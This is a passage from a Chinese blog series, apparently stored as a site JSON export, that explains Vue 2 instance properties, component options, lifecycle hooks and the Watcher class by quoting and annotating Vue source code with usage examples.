设置监听方法，访问 $props 属性的时候 直接返回 Vue 的 _props 数据 不推介使用 $props 来访问 Vue 中 props 中的数据，因为 Vue 在内部已经做了映射，直接把 props 中的属性 映射到 Vue 实例上 $el源码1234// $mount el = el &amp;&amp; inBrowser ? query(el) : undefined;// mountComponent vm.$el = el; 存储了 Vue 实例的根元素 $options源码12345678910111213141516171819202122// 初始化实例的时候传入 options 参数function Vue (options) &#123; if (!(this instanceof Vue) ) &#123; warn(&#x27;Vue is a constructor and should be called with the `new` keyword&#x27;); &#125; this._init(options);&#125;// _init 方法if (options &amp;&amp; options._isComponent) &#123; // optimize internal component instantiation // since dynamic options merging is pretty slow, and none of the // internal component options needs special treatment. initInternalComponent(vm, options); &#125; else &#123; vm.$options = mergeOptions( resolveConstructorOptions(vm.constructor), options || &#123;&#125;, vm ); &#125; 使用Vue 也支持我们自定义 property 特性，可以通过 optionMergeStrategies 配置自定义特性的合并规则 访问的时候通过 this.$options.property 来访问 $parnet 指向当前组件的 父实例，如果没有父组件实例，则为 null $children 指向组件的子组件 是一个数组 $root 指向 Vue 实例的根组件，如果没有父组件，即指向自身 123vm.$parent = parent;vm.$root = parent ? parent.$root : vm;vm.$children = []; $slots [name]: Array&lt;VNode&gt; 用来访问插槽 源码12345678910111213141516171819202122232425262728293031323334353637383940414243// initRendervm.$slots = resolveSlots(options._renderChildren, renderContext);// resolveSlotsfunction resolveSlots ( children, context) &#123; if (!children || !children.length) &#123; return &#123;&#125; &#125; var slots = &#123;&#125;; for (var i = 0, l = children.length; i &lt; l; i++) &#123; var child = children[i]; var data = child.data; // remove slot attribute if the node is resolved as a Vue slot node if (data &amp;&amp; data.attrs &amp;&amp; data.attrs.slot) &#123; delete data.attrs.slot; &#125; // named slots should only be respected if the vnode was rendered in the // same context. if ((child.context === context || child.fnContext === context) &amp;&amp; data &amp;&amp; data.slot != null ) &#123; var name = data.slot; var slot = (slots[name] || (slots[name] = [])); if (child.tag === &#x27;template&#x27;) &#123; slot.push.apply(slot, child.children || []); &#125; else &#123; slot.push(child); &#125; &#125; else &#123; (slots.default || (slots.default = [])).push(child); &#125; &#125; // ignore slots that contains only whitespace for (var name$1 in slots) &#123; if (slots[name$1].every(isWhitespace)) &#123; delete slots[name$1]; &#125; &#125; return slots&#125; 在初始化渲染的时候，解析 DOM 树，通过 resolveSlots 方法 提取出 slots 对象 resolveSlots 方法 判断 slot 属性是否为空，然后将同一个 slot 下的 node 节点 合并成一个 slot 数组,最后通过 delete 方法删除 slot 为空的数组 使用123456789101112131415161718192021222324252627&lt;blog-post&gt; &lt;template v-slot:header&gt; &lt;h1&gt;About Me&lt;/h1&gt; &lt;/template&gt; &lt;p&gt;Here&#x27;s some page content, which will be included in vm.$slots.default, because it&#x27;s not inside a named slot.&lt;/p&gt; &lt;template v-slot:footer&gt; &lt;p&gt;Copyright 2016 Evan You&lt;/p&gt; &lt;/template&gt; &lt;p&gt;If I have some content down here, it will also be included in vm.$slots.default.&lt;/p&gt;.&lt;/blog-post&gt;&lt;script&gt; Vue.component(&#x27;blog-post&#x27;, &#123; render: function (createElement) &#123; var header = this.$slots.header var body = this.$slots.default var footer = this.$slots.footer return createElement(&#x27;div&#x27;, [ createElement(&#x27;header&#x27;, header), createElement(&#x27;main&#x27;, body), createElement(&#x27;footer&#x27;, footer) ]) &#125; &#125;)&lt;/script&gt; $scopedSlots &#123; [name: string]: props =&gt; Array&lt;VNode&gt; | undefined &#125; 用来访问作用域插槽。对于包括 默认 slot 在内的每一个插槽，该对象都包含一个返回相应 VNode 的函数。 源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// Vue.prototype._renderthis.$scopedSlots = normalizeScopedSlots(data.scopedSlots, this。$slots);// 函数 normalizeScopedSlotsfunction normalizeScopedSlots ( slots, normalSlots, prevSlots) &#123; var res; var hasNormalSlots = Object.keys(normalSlots).length &gt; 0; var isStable = slots ? !!slots.$stable : !hasNormalSlots; var key = slots &amp;&amp; slots.$key; if (!slots) &#123; res = &#123;&#125;; &#125; else if (slots._normalized) &#123; // fast path 1: child component re-render only, parent did not change return slots._normalized &#125; else if ( isStable &amp;&amp; prevSlots &amp;&amp; prevSlots !== emptyObject &amp;&amp; key === prevSlots.$key &amp;&amp; !hasNormalSlots &amp;&amp; !prevSlots.$hasNormal ) &#123; // fast path 2: stable scoped slots w/ no normal slots to proxy, // only need to normalize once return prevSlots &#125; else &#123; res = &#123;&#125;; for (var key$1 in slots) &#123; if (slots[key$1] &amp;&amp; key$1[0] !== &#x27;$&#x27;) &#123; res[key$1] = normalizeScopedSlot(normalSlots, key$1, slots[key$1]); &#125; &#125; &#125; // expose normal slots on scopedSlots for (var key$2 in normalSlots) &#123; if (!(key$2 in res)) &#123; res[key$2] = proxyNormalSlot(normalSlots, key$2); &#125; &#125; // avoriaz seems to mock a non-extensible $scopedSlots object // and when that is passed down this would cause an error if (slots &amp;&amp; Object.isExtensible(slots)) &#123; (slots)._normalized = res; &#125; def(res, &#x27;$stable&#x27;, isStable); def(res, &#x27;$key&#x27;, key); def(res, &#x27;$hasNormal&#x27;, hasNormalSlots); return res&#125; $refs源码1234567891011121314151617181920212223242526272829303132333435363738394041var ref = &#123; create: function create (_, vnode) &#123; registerRef(vnode); &#125;, update: function update (oldVnode, vnode) &#123; if (oldVnode.data.ref !== vnode.data.ref) &#123; registerRef(oldVnode, true); registerRef(vnode); &#125; &#125;, destroy: function destroy (vnode) &#123; registerRef(vnode, true); &#125;&#125;;function registerRef (vnode, isRemoval) &#123; var key = vnode.data.ref; if (!isDef(key)) &#123; return &#125; var vm = vnode.context; var ref = vnode.componentInstance || vnode.elm; var refs = vm.$refs; if (isRemoval) &#123; if (Array.isArray(refs[key])) &#123; remove(refs[key], ref); &#125; else if (refs[key] === ref) &#123; refs[key] = undefined; &#125; &#125; else &#123; if (vnode.data.refInFor) &#123; if (!Array.isArray(refs[key])) &#123; refs[key] = [ref]; &#125; else if (refs[key].indexOf(ref) &lt; 0) &#123; // $flow-disable-line refs[key].push(ref); &#125; &#125; else &#123; refs[key] = ref; &#125; &#125;&#125; 通过 registerRef 方法 注册和移除旧的 VNode 使用12345678&lt;my-component ref=&quot;myComponent&quot;&gt;&lt;/my-component&gt;&lt;script&gt; export default &#123; mounted() &#123; console.log(this.$refs[&#x27;myComponent&#x27;]) &#125; &#125;&lt;/script&gt; $isServer12345678910111213var isServerRendering = function () &#123; if (_isServer === undefined) &#123; /* istanbul ignore if */ if (!inBrowser &amp;&amp; !inWeex &amp;&amp; typeof global !== &#x27;undefined&#x27;) &#123; // detect presence of vue-server-renderer and avoid // Webpack shimming the process _isServer = global[&#x27;process&#x27;] &amp;&amp; global[&#x27;process&#x27;].env.VUE_ENV === &#x27;server&#x27;; &#125; else &#123; _isServer = false; &#125; &#125; return _isServer&#125;; 判断 代码运行环境是否是服务端渲染,开启对应渲染和优化方法 $attrs 包含了父作用域中不作为 prop 被识别且获取的 attribute 绑定(除开 class 和 style)，当一个组件没有声明任何props时，这里会包含所有父作用域的绑定，并且可以通过 v-bind=&quot;$attrs&quot; 传入内部组件 12// function updateChildComponentvm.$attrs = parentVnode.data.attrs || emptyObject; $listeners 包含了父作用域中的 v-on(不包含 .natvie 修饰器) 事件监听器，可以通过 v-on=&quot;$listeners&quot; 传入内部组件 12vm.$listeners = listeners || emptyObject; $watch源码1234567891011121314151617181920212223Vue.prototype.$watch = function ( expOrFn, cb, options) &#123; var vm = this; if (isPlainObject(cb)) &#123; return createWatcher(vm, expOrFn, cb, options) &#125; options = options || &#123;&#125;; options.user = true; var watcher = new Watcher(vm, expOrFn, cb, options); if (options.immediate) &#123; try &#123; cb.call(vm, watcher.value); &#125; catch (error) &#123; handleError(error, vm, (&quot;callback for immediate watcher \\&quot;&quot; + (watcher.expression) + &quot;\\&quot;&quot;)); &#125; &#125; return function unwatchFn () &#123; watcher.teardown(); &#125;&#125;; 主要是通过 Watcher 构造函数及 createWatcher 方法对 Vue 实例的属性进行监控，然后返回一个取消观察的函数，用来停止触发回调 使用12345678910111213// 第一种使用this.$watch(&#x27;property&#x27;, cb)// 第二种使用this.$watch(&#x27;property&#x27;, cb, &#123; deep: true, immediate: true&#125;)// 第三种使用this.$watch(&#x27;property&#x27;, &#123; handler: cb, deep: true, immediate: true&#125;) $watch 方法会返回一个取消侦听函数，但是如果包含 immediate 选项时，不能在第一次回调时取消侦听给定的 property 12345678910111213141516// bad exampleconst unwatch = this.$watch(&#x27;property&#x27;, function() &#123; unwatch()&#125;, &#123; deep: true, immediate: true&#125;)// good exampleconst unwatch = this.$watch(&#x27;property&#x27;, function() &#123; if(unwatch) &#123; unwatch() &#125;&#125;, &#123; deep: true, immediate: true&#125;) $set 参考Vue.set $delete 参考Vue.delete","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (五) - 选项 / 组合 & 其他","date":"2021-01-28T06:03:16.000Z","path":"2021/01/28/vue-learn-api-with-源码-05/","text":"parent主要用来存储 Vue 组件的父组件 mixins混入，主要用来开发 Vue组件中的可复用的功能 源码12345if (child.mixins) &#123; for (var i = 0, l = child.mixins.length; i &lt; l; i++) &#123; parent = mergeOptions(parent, child.mixins[i], vm); &#125;&#125; Vue 在合并选项的时候 判断力 mixins 属性是否存在，如果存在，通过递归调用的方法合并到当前组件上 使用12345678910111213var mixin = &#123; create() &#123; console.log(&#x27;create&#x27;) &#125;, methods: &#123; getInfo() &#123; console.log(&#x27;getInfo&#x27;) &#125; &#125;&#125;export default &#123; mixins: [mixin]&#125; extends源码具体理解可以参考 Vue.extend123if (child.extends) &#123; parent = mergeOptions(parent, child.extends, vm);&#125; 使用12345678910111213var extend = &#123; create() &#123; console.log(&#x27;create&#x27;) &#125;, methods: &#123; getInfo() &#123; console.log(&#x27;getInfo&#x27;) &#125; &#125;&#125;export default &#123; extends: extend&#125; provide/inject provide Object | () =&gt; Object inject Array&lt;string&gt; | [key:string]: string | Symbol | Object 父组件通过 provide 提供依赖，子孙组件通过 inject 将依赖注入到当前组件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// 在 mergeOptionStract 配置中， provide 通过mergeData方法从父组件中绑定到子组件function initProvide (vm) &#123; var provide = vm.$options.provide; if (provide) &#123; vm._provided = typeof provide === &#x27;function&#x27; ? provide.call(vm) : provide; &#125;&#125;function initInjections (vm) &#123; var result = resolveInject(vm.$options.inject, vm); if (result) &#123; toggleObserving(false); Object.keys(result).forEach(function (key) &#123; /* istanbul ignore else */ &#123; defineReactive$$1(vm, key, result[key], function () &#123; warn( &quot;Avoid mutating an injected value directly since the changes will be &quot; + &quot;overwritten whenever the provided component re-renders. &quot; + &quot;injection being mutated: \\&quot;&quot; + key + &quot;\\&quot;&quot;, vm ); &#125;); &#125; &#125;); toggleObserving(true); &#125;&#125;// 处理实例上的 inject 方法 返回处理之后的对象function resolveInject (inject, vm) &#123; if (inject) &#123; // inject is :any because flow is not smart enough to figure out cached var result = Object.create(null); var keys = hasSymbol ? Reflect.ownKeys(inject) : Object.keys(inject); for (var i = 0; i &lt; keys.length; i++) &#123; var key = keys[i]; // #6574 in case the inject object is observed... if (key === &#x27;__ob__&#x27;) &#123; continue &#125; var provideKey = inject[key].from; var source = vm; while (source) &#123; if (source._provided &amp;&amp; hasOwn(source._provided, provideKey)) &#123; result[key] = source._provided[provideKey]; break &#125; source = source.$parent; &#125; if (!source) &#123; if (&#x27;default&#x27; in inject[key]) &#123; var provideDefault = inject[key].default; result[key] = typeof provideDefault === &#x27;function&#x27; ? provideDefault.call(vm) : provideDefault; &#125; else &#123; warn((&quot;Injection \\&quot;&quot; + key + &quot;\\&quot; not found&quot;), vm); &#125; &#125; &#125; return result &#125;&#125; 使用12345678910111213141516// 父组件export default &#123; data() &#123; return &#123; bar: 342 &#125; &#125; provide: &#123; foo: &#x27;bar&#x27;, bar: this.bar &#125;&#125;// 子组件export default &#123; inject:[&#x27;foo&#x27;,&#x27;bar&#x27;]&#125; 高级使用技巧利用 Symbol 传递 12345678910111213const s = Symbol()const Provider = &#123; provide() &#123; return &#123; [s]: &#x27;foo&#x27; &#125; &#125;&#125;const Child = &#123; inject:&#123; s &#125;&#125; inject 的值作为 props 和 data 的初始值 1234567891011const child = &#123; inject: [&#x27;foo&#x27;], props: &#123; prop: &#123; default: this.foo &#125; &#125;, data() &#123; bar: this.foo &#125;&#125; name name 属性允许组件模板递归调用自身 delimiters 改变 纯文本插入分隔符 默认为[‘,‘] 源码12345678var defaultTagRE = /\\&#123;\\&#123;((?:.|\\r?\\n)+?)\\&#125;\\&#125;/g;var regexEscapeRE = /[-.*+?^$&#123;&#125;()|[\\]\\/\\\\]/g;var buildRegex = cached(function (delimiters) &#123; var open = delimiters[0].replace(regexEscapeRE, &#x27;\\\\$&amp;&#x27;); var close = delimiters[1].replace(regexEscapeRE, &#x27;\\\\$&amp;&#x27;); return new RegExp(open + &#x27;((?:.|\\\\n)+?)&#x27; + close, &#x27;g&#x27;)&#125;); 使用123new Vue(&#123; delimiters: [&#x27;$&#123;&#x27;,&#x27;&#125;&#x27;] // Vue 进行字符串切割替换的时候将会仿照 es6 的模板字符串&#125;) functional函数元组件 无状态(data)，无上下文(this)，没有响应式数据，相当于只是一个渲染组件，渲染之后就不会发生变化 1234567891011121314151617181920212223242526272829303132333435function createFunctionalComponent (Ctor,propsData,data,contextVm,children) &#123; var options = Ctor.options; var props = &#123;&#125;; var propOptions = options.props; if (isDef(propOptions)) &#123; for (var key in propOptions) &#123; props[key] = validateProp(key, propOptions, propsData || emptyObject); &#125; &#125; else &#123; if (isDef(data.attrs)) &#123; mergeProps(props, data.attrs); &#125; if (isDef(data.props)) &#123; mergeProps(props, data.props); &#125; &#125; var renderContext = new FunctionalRenderContext( data, props, children, contextVm, Ctor ); var vnode = options.render.call(null, renderContext._c, renderContext); if (vnode instanceof VNode) &#123; return cloneAndMarkFunctionalResult(vnode, data, renderContext.parent, options, renderContext) &#125; else if (Array.isArray(vnode)) &#123; var vnodes = normalizeChildren(vnode) || []; var res = new Array(vnodes.length); for (var i = 0; i &lt; vnodes.length; i++) &#123; res[i] = cloneAndMarkFunctionalResult(vnodes[i], data, renderContext.parent, options, renderContext); &#125; return res &#125;&#125; 使用 context 参数 字段详解 props 提供所有 props 对象 children VNode 子节点的数组 slots 一个函数，返回了包含所有插槽的对象 scopedSlots 一个暴露传入的作用域插槽的对象，也已函数形式暴露普通插槽 data 传给组件的整个数据对象，作为 createElement 函数的第二个参数传入组件 parent 对父组件的引用 listeners 一个包含了所有父组件为当前组件注册的时间监听器对象，这是data.on的一个别名 injection 注入的 property 123456789&lt;div id=&quot;app&quot;&gt; &lt;div&gt;this is test for directive&lt;/div&gt; &lt;function-component :list=&quot;list&quot; other=&quot;other&quot;&gt; this is a slot &#123;&#123;list.name&#125;&#125; &lt;div slot=&quot;default&quot;&gt; this is slot default &lt;/div&gt; &lt;/function-component&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;script&gt; Vue.component(&#x27;function-component&#x27;, &#123; functional: true, props: &#123; list: &#123; type: Object, default: () =&gt; &#123; return &#123;&#125; &#125; &#125; &#125;, render: function (createElement, context) &#123; const header = context.scopedSlots.default() return createElement( &#x27;div&#x27;, [ createElement(&#x27;div&#x27;, [header[0]]), createElement(&#x27;div&#x27;, [header[1]]) ] ) &#125; &#125;) var app = new Vue(&#123; el: &quot;#app&quot;, data: () =&gt; &#123; return &#123; test3: 4, testChild: 5, hide: true, list: &#123; name: &#x27;listName&#x27;, value: &#x27;listValue&#x27; &#125; &#125; &#125;, computed: &#123; test() &#123; return &#123; test1: 4 &#125; &#125; &#125;, &#125;)&lt;/script&gt; model prop(可选) String event(可选) String 允许一个自定义组件在使用 v-model 时定制定制 prop 和 event，默认情况下，一个组件上的 v-model 会把 value 用作 prop 且把 input 用作 event，一些复杂的输入框可以使用 model 选项回避这些情况产生的冲突 源码12345678910111213141516171819function transformModel (options, data) &#123; var prop = (options.model &amp;&amp; options.model.prop) || &#x27;value&#x27;; var event = (options.model &amp;&amp; options.model.event) || &#x27;input&#x27; ;(data.attrs || (data.attrs = &#123;&#125;))[prop] = data.model.value; var on = data.on || (data.on = &#123;&#125;); var existing = on[event]; var callback = data.model.callback; if (isDef(existing)) &#123; if ( Array.isArray(existing) ? existing.indexOf(callback) === -1 : existing !== callback ) &#123; on[event] = [callback].concat(existing); &#125; &#125; else &#123; on[event] = callback; &#125;&#125; 在设置值的时候通过一个 ||(或) 来判断 model 是否赋值，否则取默认设置的 value 及 input 使用123456789101112131415161718&lt;input v-model=&quot;inputValue&quot;&gt;&lt;!-- input 组件内部 --&gt;&lt;script&gt; export default &#123; model: &#123; prop: &#x27;text&#x27; event: &#x27;change&#x27; &#125;, props: &#123; text: String &#125;, methods: &#123; handleChange(value) &#123; this.$emit(&#x27;change&#x27;, value) &#125; &#125; &#125;&lt;/script&gt; inheritAttrs 默认情况下父作用域的不被认作 props 的 attribute 绑定 (attribute bindings) 将会“回退”且作为普通的 HTML attribute 应用在子组件的根元素上。当撰写包裹一个目标元素或另一个组件的组件时，这可能不会总是符合预期行为。通过设置 inheritAttrs 到 false，这些默认行为将会被去掉。而通过 (同样是 2.4 新增的) 实例 property $attrs 可以让这些 attribute 生效，且可以通过 v-bind 显性的绑定到非根元素上 源码12345678910111213141516171819202122232425262728293031323334353637383940function updateAttrs (oldVnode, vnode) &#123; var opts = vnode.componentOptions; if (isDef(opts) &amp;&amp; opts.Ctor.options.inheritAttrs === false) &#123; return &#125; if (isUndef(oldVnode.data.attrs) &amp;&amp; isUndef(vnode.data.attrs)) &#123; return &#125; var key, cur, old; var elm = vnode.elm; var oldAttrs = oldVnode.data.attrs || &#123;&#125;; var attrs = vnode.data.attrs || &#123;&#125;; // clone observed objects, as the user probably wants to mutate it if (isDef(attrs.__ob__)) &#123; attrs = vnode.data.attrs = extend(&#123;&#125;, attrs); &#125; for (key in attrs) &#123; cur = attrs[key]; old = oldAttrs[key]; if (old !== cur) &#123; setAttr(elm, key, cur); &#125; &#125; // #4391: in IE9, setting type can reset value for input[type=radio] // #6666: IE/Edge forces progress value down to 1 before setting a max /* istanbul ignore if */ if ((isIE || isEdge) &amp;&amp; attrs.value !== oldAttrs.value) &#123; setAttr(elm, &#x27;value&#x27;, attrs.value); &#125; for (key in oldAttrs) &#123; if (isUndef(attrs[key])) &#123; if (isXlink(key)) &#123; elm.removeAttributeNS(xlinkNS, getXlinkProp(key)); &#125; else if (!isEnumeratedAttr(key)) &#123; elm.removeAttribute(key); &#125; &#125; &#125;&#125; 在更新的时候 判断一下 inheritAttrs 的值，如果为 false 直接返回 使用1234// 子组件export default &#123; inheritAttrs: false&#125; comments 主要作用是 是否保留渲染模板中的 HTML 注释","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (四) - 选项 / DOM 及 生命周期函数、filters,directives,components","date":"2021-01-27T14:16:53.000Z","path":"2021/01/27/vue-learn-api-with-源码-04/","text":"el，template render源码el 指定的元素作为 Vue 实例的挂载目标 主要是通过 Vue 实例的 $mount 方法 $mount 方法 主要 通过 el 获取到 DOM 元素 然后调用 mountComponents 方法 绑定到 Vue 实例上，最后返回 Vue 实例1234567Vue.prototype.$mount = function ( el, hydrating) &#123; el = el &amp;&amp; inBrowser ? query(el) : undefined; return mountComponent(this, el, hydrating)&#125;; mountComponent 方法 判断 是否有render函数，没有提示至少要有template或者render函数 (tempalte,el,render 不同同时使用) 调用 beforeMount 声明周期 判断是否开启性能优化检查 对 vm 的 updateComponet 函数进行 监听变化，如果发生变化，触发 beforeUpdate 生命周期函数 Vue 实例上挂载了 node 节点后更改 Vue 是否挂载状态 调用 mounted 生命周期 返回 挂载了 DOM 元素的 Vue 实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function mountComponent (vm, el, hydrating) &#123; vm.$el = el; if (!vm.$options.render) &#123; vm.$options.render = createEmptyVNode; &#123; /* istanbul ignore if */ if ((vm.$options.template &amp;&amp; vm.$options.template.charAt(0) !== &#x27;#&#x27;) || vm.$options.el || el) &#123; warn( &#x27;You are using the runtime-only build of Vue where the template &#x27; + &#x27;compiler is not available. Either pre-compile the templates into &#x27; + &#x27;render functions, or use the compiler-included build.&#x27;, vm ); &#125; else &#123; warn( &#x27;Failed to mount component: template or render function not defined.&#x27;, vm ); &#125; &#125; &#125; callHook(vm, &#x27;beforeMount&#x27;); var updateComponent; /* istanbul ignore if */ if (config.performance &amp;&amp; mark) &#123; updateComponent = function () &#123; var name = vm._name; var id = vm._uid; var startTag = &quot;vue-perf-start:&quot; + id; var endTag = &quot;vue-perf-end:&quot; + id; mark(startTag); var vnode = vm._render(); mark(endTag); measure((&quot;vue &quot; + name + &quot; render&quot;), startTag, endTag); mark(startTag); vm._update(vnode, hydrating); mark(endTag); measure((&quot;vue &quot; + name + &quot; patch&quot;), startTag, endTag); &#125;; &#125; else &#123; updateComponent = function () &#123; vm._update(vm._render(), hydrating); &#125;; &#125; // we set this to vm._watcher inside the watcher&#x27;s constructor // since the watcher&#x27;s initial patch may call $forceUpdate (e.g. inside child // component&#x27;s mounted hook), which relies on vm._watcher being already defined new Watcher(vm, updateComponent, noop, &#123; before: function before () &#123; if (vm._isMounted &amp;&amp; !vm._isDestroyed) &#123; callHook(vm, &#x27;beforeUpdate&#x27;); &#125; &#125; &#125;, true /* isRenderWatcher */); hydrating = false; // manually mounted instance, call mounted on self // mounted is called for render-created child components in its inserted hook if (vm.$vnode == null) &#123; vm._isMounted = true; callHook(vm, &#x27;mounted&#x27;); &#125; return vm&#125; 使用12345678910111213new Vue(&#123; el: &#x27;#app&#x27;, template: `&lt;div&gt;test&lt;/div&gt;`&#125;)new Vue(&#123; template: `&lt;div&gt;test&lt;/div&gt;`&#125;).$mount(&#x27;#app&#x27;)new Vue(&#123; el: &#x27;#app&#x27;, render: (h) =&gt; h()&#125;) 生命周期函数源码12345678910111213141516171819202122232425262728293031function callHook (vm, hook) &#123; // #7573 disable dep collection when invoking lifecycle hooks pushTarget(); var handlers = vm.$options[hook]; // 接收到的是一个数组 var info = hook + &quot; hook&quot;; if (handlers) &#123; for (var i = 0, j = handlers.length; i &lt; j; i++) &#123; invokeWithErrorHandling(handlers[i], vm, null, vm, info); &#125; &#125; if (vm._hasHookEvent) &#123; vm.$emit(&#x27;hook:&#x27; + hook); &#125; popTarget();&#125;function invokeWithErrorHandling (handler,context,args,vm,info) &#123; var res; try &#123; res = args ? handler.apply(context, args) : handler.call(context); if (res &amp;&amp; !res._isVue &amp;&amp; isPromise(res) &amp;&amp; !res._handled) &#123; res.catch(function (e) &#123; return handleError(e, vm, info + &quot; (Promise/async)&quot;); &#125;); // issue #9511 // avoid catch triggering multiple times when nested calls res._handled = true; &#125; &#125; catch (e) &#123; handleError(e, vm, info); &#125; return res&#125; 在 callHook 方法中，主要是针对组件 生命周期进行处理，调用 invokeWithErrorHandling 方法 执行生命周期函数 在 invokeWithErrorHandling 方法中，通过 call 和 apply 执行生命周期函数及传参 使用生命周期函数 beforeCreate created beforeMount mounted beforeUpdate updated beforeDestroy destroyed activated deactivated errorCaptured serverPrefetch 生命周期函数执行顺序 在 initMixin函数中，定义了 Vue 的 _init 函数，初始化 Vue 信息，合并 Vue 的 options 信息，初始化生命周期，初始化事件对象，初始化渲染方法 调用 beforeCreate 生命周期 不能访问到数据和dom元素，但是能够访问生命周期函数 初始化注册函数，初始化 data，props，methods，watch,provide 调用 created 生命周期 能获取到数据及方法，但是无法操作 dom 调用 $mount 方法挂载 DOM 元素 绑定 el 对应的 DOM 元素 调用 beforeMount 生命周期 调用 _update 挂载 DOM 元素, 使用 Watcher 构造函数 监听 updateComponent 方法，触发 beforeUpdate 生命周期 调用 mounted 生命周期 页面发生变化 时触发 updated 生命周期 页面销毁时时触发 $destroy 方法 调用 beforeDestroy 生命周期 清空 watcher，child，组件 及事件监听函数 调用 destroyed 生命周期 特殊的生命周期函数 activated/deactivated 只有被 keep-alive 组件包围的组件才有 这个生命周期函数 errorCaptured 全局报错信息的生命周期函数，报错捕获 directives源码请参照 Vue.directive 使用123456789export default &#123; directives: &#123; clip: &#123; insert: function() &#123;&#125;, bind: function() &#123;&#125; componentUpdate: function() &#123;&#125; &#125; &#125;&#125; filters源码请参照 Vue.filter 使用1234567export default &#123; filters: &#123; clip: function(value) &#123; return value &#125; &#125;&#125; components源码请参照 Vue.component 使用123456export default &#123; components: &#123; FirstComponent, SecondComponent &#125;&#125;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (三) - Watcher 方法详解","date":"2021-01-27T13:45:28.000Z","path":"2021/01/27/vue-learn-api-with-源码-watcher/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198var Watcher = function Watcher ( vm, // Vue 实例 expOrFn, // key值，watch 的属性 cb, // 回调函数 options, // 配置 &#123;lazy: true&#125; isRenderWatcher // 是否 在 Vue 实例上记载 Watcher ) &#123; this.vm = vm; if (isRenderWatcher) &#123; vm._watcher = this; &#125; vm._watchers.push(this); // options if (options) &#123; this.deep = !!options.deep; // 深度监听 针对 对象 this.user = !!options.user; this.lazy = !!options.lazy; this.sync = !!options.sync; this.before = options.before; &#125; else &#123; this.deep = this.user = this.lazy = this.sync = false; &#125; this.cb = cb; this.id = ++uid$2; // uid for batching this.active = true; this.dirty = this.lazy; // for lazy watchers this.deps = []; this.newDeps = []; this.depIds = new _Set(); this.newDepIds = new _Set(); this.expression = expOrFn.toString(); // parse expression for getter if (typeof expOrFn === &#x27;function&#x27;) &#123; // 判断 传入的 watch 函数 是否是函数，如果是函数，直接设置为 getter 函数 this.getter = expOrFn; &#125; else &#123; // 如果是对象，提取 函数 this.getter = parsePath(expOrFn); if (!this.getter) &#123; this.getter = noop; warn( &quot;Failed watching path: \\&quot;&quot; + expOrFn + &quot;\\&quot; &quot; + &#x27;Watcher only accepts simple dot-delimited paths. &#x27; + &#x27;For full control, use a function instead.&#x27;, vm ); &#125; &#125; this.value = this.lazy ? undefined : this.get();&#125;;/** * Evaluate the getter, and re-collect dependencies. */Watcher.prototype.get = function get () &#123; pushTarget(this); // 设置 Dep 构造函数的 target 为当前 Watcher 实例 var value; var vm = this.vm; try &#123; value = this.getter.call(vm, vm); // 调用 getter 函数，并将 vue 实例作为参数传进去 &#125; catch (e) &#123; if (this.user) &#123; handleError(e, vm, (&quot;getter for watcher \\&quot;&quot; + (this.expression) + &quot;\\&quot;&quot;)); &#125; else &#123; throw e &#125; &#125; finally &#123; // &quot;touch&quot; every property so they are all tracked as // dependencies for deep watching if (this.deep) &#123; traverse(value); &#125; popTarget(); this.cleanupDeps(); &#125; return value&#125;;/** * Add a dependency to this directive. */// 此处 添加发布订阅模式，将 发布订阅模式 与 watcher 关联起来Watcher.prototype.addDep = function addDep (dep) &#123; var id = dep.id; if (!this.newDepIds.has(id)) &#123; this.newDepIds.add(id); this.newDeps.push(dep); if (!this.depIds.has(id)) &#123; dep.addSub(this); &#125; &#125;&#125;;/** * Clean up for dependency collection. */Watcher.prototype.cleanupDeps = function cleanupDeps () &#123; var i = this.deps.length; while (i--) &#123; var dep = this.deps[i]; if (!this.newDepIds.has(dep.id)) &#123; dep.removeSub(this); &#125; &#125; var tmp = this.depIds; this.depIds = this.newDepIds; this.newDepIds = tmp; this.newDepIds.clear(); tmp = this.deps; this.deps = this.newDeps; this.newDeps = tmp; this.newDeps.length = 0;&#125;;/** * Subscriber interface. * Will be called when a dependency changes. */Watcher.prototype.update = function update () &#123; /* istanbul ignore else */ if (this.lazy) &#123; this.dirty = true; &#125; else if (this.sync) &#123; this.run(); &#125; else &#123; queueWatcher(this); &#125;&#125;;/** * Scheduler job interface. * Will be called by the scheduler. */Watcher.prototype.run = function run () &#123; if (this.active) &#123; var value = this.get(); if ( value !== this.value || // Deep watchers and watchers on Object/Arrays should fire even // when the value is the same, because the value may // have mutated. isObject(value) || this.deep ) &#123; // set new value var oldValue = this.value; this.value = value; if (this.user) &#123; try &#123; this.cb.call(this.vm, value, oldValue); &#125; catch (e) &#123; handleError(e, this.vm, (&quot;callback for watcher \\&quot;&quot; + (this.expression) + &quot;\\&quot;&quot;)); &#125; &#125; else &#123; this.cb.call(this.vm, value, oldValue); &#125; &#125; &#125;&#125;;/** * Evaluate the value of the watcher. * This only gets called for lazy watchers. */Watcher.prototype.evaluate = function evaluate () &#123; this.value = this.get(); this.dirty = false;&#125;;/** * Depend on all deps collected by this watcher. */Watcher.prototype.depend = function depend () &#123; var i = this.deps.length; while (i--) &#123; this.deps[i].depend(); &#125;&#125;;/** * Remove self from all dependencies&#x27; subscriber list. */Watcher.prototype.teardown = function teardown () &#123; if (this.active) &#123; // remove self from 